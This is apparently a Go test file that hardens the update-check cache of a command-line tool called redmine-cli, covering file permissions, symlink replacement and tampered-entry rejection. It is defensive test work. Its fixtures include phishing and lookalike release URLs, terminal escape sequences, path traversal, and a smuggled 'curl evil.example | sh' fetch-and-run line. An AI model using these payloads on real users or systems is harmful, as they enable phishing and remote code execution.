package update

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"
)

// --- Cache hardening ---

func TestWriteCache_Permissions(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX permissions only")
	}
	setCachePath(t, t.TempDir())
	// Simulate a cache written by an older version with 0644.
	if err := os.WriteFile(cachePath(), []byte("{}"), 0o644); err != nil {
		t.Fatal(err)
	}

	writeCache(&updateCheckCache{
		CheckedAt:          time.Now(),
		CheckedFromVersion: "1.0.0",
		LatestVersion:      "2.0.0",
		ReleaseURL:         "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0",
		UpdateAvailable:    true,
	})

	info, err := os.Stat(cachePath())
	if err != nil {
		t.Fatal(err)
	}
	if perm := info.Mode().Perm(); perm != 0o600 {
		t.Errorf("cache mode = %o, want 600", perm)
	}
}

// TestWriteCache_ReplacesSymlink checks that the cache is renamed into place
// rather than written through whatever sits at the path.
func TestWriteCache_ReplacesSymlink(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("symlinks need privileges on Windows")
	}
	dir := t.TempDir()
	setCachePath(t, dir)
	target := filepath.Join(t.TempDir(), "victim")
	if err := os.WriteFile(target, []byte("keep"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(target, cachePath()); err != nil {
		t.Fatal(err)
	}

	writeCache(&updateCheckCache{
		CheckedAt:          time.Now(),
		CheckedFromVersion: "1.0.0",
		LatestVersion:      "2.0.0",
		ReleaseURL:         "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0",
		UpdateAvailable:    true,
	})

	if data, err := os.ReadFile(target); err != nil || string(data) != "keep" {
		t.Errorf("symlink target = %q, %v; want it untouched", data, err)
	}
	info, err := os.Lstat(cachePath())
	if err != nil {
		t.Fatal(err)
	}
	if !info.Mode().IsRegular() {
		t.Errorf("cache path mode = %v, want a regular file", info.Mode())
	}
	if c := readCache(); c == nil || c.LatestVersion != "2.0.0" {
		t.Errorf("readCache() = %+v, want the new entry", c)
	}
	entries, err := os.ReadDir(dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(entries) != 1 {
		var names []string
		for _, e := range entries {
			names = append(names, e.Name())
		}
		t.Errorf("cache dir holds %v, want only the cache file (no temp files left)", names)
	}
}

func TestReadCache_RejectsTamperedEntries(t *testing.T) {
	valid := func() map[string]any {
		return map[string]any{
			"checked_at":           time.Now().Format(time.RFC3339),
			"checked_from_version": "1.0.0",
			"latest_version":       "2.0.0",
			"release_url":          "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0",
			"update_available":     true,
		}
	}

	tests := []struct {
		name   string
		mutate func(m map[string]any)
		raw    string
		want   bool
	}{
		{name: "valid entry", mutate: func(map[string]any) {}, want: true},
		{name: "prerelease version", mutate: func(m map[string]any) {
			m["latest_version"] = "3.0.0-rc.1"
			m["release_url"] = "https://github.com/aarondpn/redmine-cli/releases/tag/v3.0.0-rc.1"
		}, want: true},
		// PoC from the audit: a planted cache entry pointing at a phishing page.
		{name: "phishing release url", mutate: func(m map[string]any) {
			m["release_url"] = "https://evil.example/redmine-cli/releases/tag/v2.0.0"
		}},
		{name: "lookalike host", mutate: func(m map[string]any) {
			m["release_url"] = "https://github.com.evil.example/aarondpn/redmine-cli/releases/tag/v2.0.0"
		}},
		{name: "other repository", mutate: func(m map[string]any) {
			m["release_url"] = "https://github.com/attacker/redmine-cli/releases/tag/v2.0.0"
		}},
		{name: "plain http", mutate: func(m map[string]any) {
			m["release_url"] = "http://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0"
		}},
		{name: "terminal escape in url", mutate: func(m map[string]any) {
			m["release_url"] = "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0\x1b]8;;https://evil.example\x07"
		}},
		{name: "newline in url", mutate: func(m map[string]any) {
			m["release_url"] = "https://github.com/aarondpn/redmine-cli/releases/\nRun: curl evil.example | sh"
		}},
		// Starts with the releases prefix but resolves to another repository.
		{name: "dot segments in url", mutate: func(m map[string]any) {
			m["release_url"] = "https://github.com/aarondpn/redmine-cli/releases/../../attacker/repo"
		}},
		{name: "nested path in url", mutate: func(m map[string]any) {
			m["release_url"] = "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0/../../../../attacker/repo"
		}},
		{name: "empty url", mutate: func(m map[string]any) { m["release_url"] = "" }},
		{name: "bogus version", mutate: func(m map[string]any) { m["latest_version"] = "2.0.0\nRun: curl evil.example | sh" }},
		{name: "missing version", mutate: func(m map[string]any) { delete(m, "latest_version") }},
		{name: "missing from version", mutate: func(m map[string]any) { delete(m, "checked_from_version") }},
		{name: "missing checked_at", mutate: func(m map[string]any) { delete(m, "checked_at") }},
		// A far-future timestamp would never expire and could pin a
		// "no update available" answer forever.
		{name: "future checked_at", mutate: func(m map[string]any) {
			m["checked_at"] = time.Now().Add(365 * 24 * time.Hour).Format(time.RFC3339)
		}},
		{name: "wrong types", raw: `{"checked_at":"x","latest_version":2}`},
		{name: "oversized file", raw: `{"pad":"` + strings.Repeat("a", maxCacheBytes) + `"}`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			setCachePath(t, t.TempDir())
			data := []byte(tt.raw)
			if tt.raw == "" {
				m := valid()
				tt.mutate(m)
				var err error
				data, err = json.Marshal(m)
				if err != nil {
					t.Fatal(err)
				}
			}
			if err := os.WriteFile(cachePath(), data, 0o600); err != nil {
				t.Fatal(err)
			}
			if got := readCache() != nil; got != tt.want {
				t.Errorf("readCache accepted = %v, want %v", got, tt.want)
			}
		})
	}
}

// TestCheckForUpdateCached_PoisonedCacheNotPrinted reproduces the audit PoC
// end to end: a planted positive cache entry with a phishing URL must be
// ignored, falling back to a live check, and never reach the notice.
func TestCheckForUpdateCached_PoisonedCacheNotPrinted(t *testing.T) {
	var fetchCalled bool
	stubFetchRelease(t, func(ctx context.Context) (*GithubRelease, error) {
		fetchCalled = true
		return &GithubRelease{TagName: "v2.0.0"}, nil
	})
	setCachePath(t, t.TempDir())
	poisoned := `{"checked_at":"` + time.Now().Format(time.RFC3339) + `","checked_from_version":"1.0.0",` +
		`"latest_version":"9.9.9","release_url":"https://evil.example/download","update_available":true}`
	if err := os.WriteFile(cachePath(), []byte(poisoned), 0o644); err != nil {
		t.Fatal(err)
	}

	result := CheckForUpdateCached(context.Background(), "1.0.0")
	if !fetchCalled {
		t.Error("expected live fetch after rejecting the poisoned cache")
	}
	var buf bytes.Buffer
	PrintNotice(&buf, "1.0.0", result)
	if strings.Contains(buf.String(), "evil.example") || strings.Contains(buf.String(), "9.9.9") {
		t.Fatalf("poisoned cache leaked into notice:\n%s", buf.String())
	}
	if !strings.Contains(buf.String(), "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0") {
		t.Errorf("expected live release URL in notice, got:\n%s", buf.String())
	}
}

func TestCheckForUpdateCached_UnsafeTagNotCached(t *testing.T) {
	stubFetchRelease(t, func(ctx context.Context) (*GithubRelease, error) {
		return &GithubRelease{TagName: "v2.0.0\x1b[2J"}, nil
	})
	setCachePath(t, t.TempDir())

	if result := CheckForUpdateCached(context.Background(), "1.0.0"); result != nil {
		t.Errorf("expected nil result for unsafe tag, got %+v", result)
	}
	if _, err := os.Stat(cachePath()); !os.IsNotExist(err) {
		t.Errorf("expected no cache file for unsafe tag, stat err = %v", err)
	}
}

func TestPrintNotice_RejectsUnvalidatedResult(t *testing.T) {
	tests := []struct {
		name   string
		result *CheckResult
	}{
		{name: "foreign url", result: &CheckResult{NewVersion: "2.0.0", ReleaseURL: "https://evil.example/"}},
		{name: "escape in version", result: &CheckResult{NewVersion: "2.0.0\x1b[2J", ReleaseURL: "https://github.com/aarondpn/redmine-cli/releases/tag/v2.0.0"}},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			var buf bytes.Buffer
			PrintNotice(&buf, "1.0.0", tt.result)
			if buf.Len() != 0 {
				t.Errorf("expected no output, got %q", buf.String())
			}
		})
	}
}
